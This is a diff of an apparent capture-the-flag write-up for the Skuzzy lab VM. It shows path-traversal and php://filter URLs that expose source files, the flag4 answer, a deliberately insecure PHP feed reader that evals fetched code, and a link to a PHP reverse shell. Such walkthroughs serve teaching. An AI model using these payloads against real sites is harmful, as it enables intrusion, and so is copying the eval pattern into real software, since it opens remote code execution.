@@ -373,31 +373,204 @@
 
 <p><a href="http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=../../../../var/log/wtmp">http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=../../../../var/log/wtmp</a></p>
 
-<p><a href="http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php">http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php</a></p>
+<p>Download the flag.php source</p>
 
-<p>~/EW_Skuzzy # cat flag.php
-&lt;?php
-defined (&lsquo;VIAINDEX&rsquo;) or die(&lsquo;Ooooh! So close..&rsquo;);
-?></p>
+<p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php</a></p>
 
-<h1>Flag</h1>
+<p>Flag 4</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>~/EW_Skuzzy # cat flag.php 
+</span><span class='line'>&lt;?php
+</span><span class='line'>defined ('VIAINDEX') or die('Ooooh! So close..');
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;h1&gt;Flag&lt;/h1&gt;
+</span><span class='line'>&lt;p&gt;Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?&lt;/p&gt;
+</span><span class='line'>&lt;img src="trollface.png" /&gt;
+</span><span class='line'>&lt;?php
+</span><span class='line'>// Ok, ok. Here's your flag! 
+</span><span class='line'>//
+</span><span class='line'>// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+</span><span class='line'>// 
+</span><span class='line'>// Well done, you're doing great so far!
+</span><span class='line'>// Next step. SHELL!
+</span><span class='line'>//
+</span><span class='line'>// 
+</span><span class='line'>// Oh. That flag above? You're gonna need it... 
+</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>
 
 
-<p>Hmm. Looking for a flag? Come on&#8230; I haven&#8217;t made it easy yet, did you think I was going to this time?</p>
+<p>Download the reader source</p>
+
+<p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
+</span><span class='line'>defined ('VIAINDEX') or die('Ooooh! So close..');
+</span><span class='line'>?&gt;
+</span><span class='line'>&lt;h1&gt;Feed Reader&lt;/h1&gt;
+</span><span class='line'>&lt;?php
+</span><span class='line'>if(isset($_GET['url'])) {
+</span><span class='line'>    $url = $_GET['url'];
+</span><span class='line'>} else {
+</span><span class='line'>    print("&lt;a href=\"?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt\"&gt;Load Feed&lt;/a&gt;");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>if(isset($url) && strlen($url) != '') {
+</span><span class='line'>
+</span><span class='line'>    // Setup some variables.
+</span><span class='line'>    $secretok = false;
+</span><span class='line'>    $keyneeded = true;
+</span><span class='line'>
+</span><span class='line'>    // Localhost as a source doesn't need to use the key.
+</span><span class='line'>    if(preg_match("#^http://127.0.0.1#", $url)) {
+</span><span class='line'>        $keyneeded = false;
+</span><span class='line'>        $secretok = true;
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    // Handle the key validation when it's needed.
+</span><span class='line'>    if($keyneeded) {
+</span><span class='line'>        $key = $_GET['key'];
+</span><span class='line'>        if(is_array($key)) {
+</span><span class='line'>            die("Array trick is mitigated ;)");
+</span><span class='line'>        }
+</span><span class='line'>        if(isset($key) && strlen($key) == '47') {
+</span><span class='line'>        $hashedkey = hash('sha256', $key);
+</span><span class='line'>            $secret = "5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656";
+</span><span class='line'>
+</span><span class='line'>            // If you can use the following code for a timing attack
+</span><span class='line'>            // then good luck :) But.. You have the source anyway, right? :)
+</span><span class='line'>        if(strcmp($hashedkey, $secret) == 0) {
+</span><span class='line'>                $secretok = true;
+</span><span class='line'>            } else {
+</span><span class='line'>                die("Sorry... Authentication failed. Key was invalid.");
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        } else {
+</span><span class='line'>            die("Authentication invalid. You might need a key.");
+</span><span class='line'>        }
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    // Just to make sure the above key check was passed.
+</span><span class='line'>    if(!$secretok) {
+</span><span class='line'>        die("Something went wrong with the authentication process");
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    // Now load the contents of the file we are reading, and parse
+</span><span class='line'>    // the super awesomeness of its contents!
+</span><span class='line'>    $f = file_get_contents($url);
+</span><span class='line'>
+</span><span class='line'>    $text = preg_split("/##text##/s", $f);
+</span><span class='line'>
+</span><span class='line'>    if(isset($text['1']) && strlen($text['1']) &gt; 0) {
+</span><span class='line'>        print($text['1']);
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    print "&lt;br /&gt;&lt;br /&gt;";
+</span><span class='line'>
+</span><span class='line'>    $php = preg_split("/##php##/s", $f);
+</span><span class='line'>
+</span><span class='line'>    if(isset($php['1']) && strlen($php['1']) &gt; 0) {
+</span><span class='line'>        eval($php['1']);
+</span><span class='line'>        // "If Eval is the answer, you're asking the wrong question!" - SG
+</span><span class='line'>        // It hurts me to write insecure code like this, but it is in the
+</span><span class='line'>        // name of education, and FUN, so I'll let it slide this time.
+</span><span class='line'>    }
+</span><span class='line'>}
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="trollface.png" />
-&lt;?php
-// Ok, ok. Here&rsquo;s your flag!
-//
-// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
-//
-// Well done, you&rsquo;re doing great so far!
-// Next step. SHELL!
-//
-//
-// Oh. That flag above? You&rsquo;re gonna need it&hellip;
-?></p>
+<p>We know from the above code we require a key and that it needs to be 47 char long. lets try our flag4</p>
+
+<p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4</a>{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=<a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/data.txt">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/data.txt</a></p>
 
 <p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
 
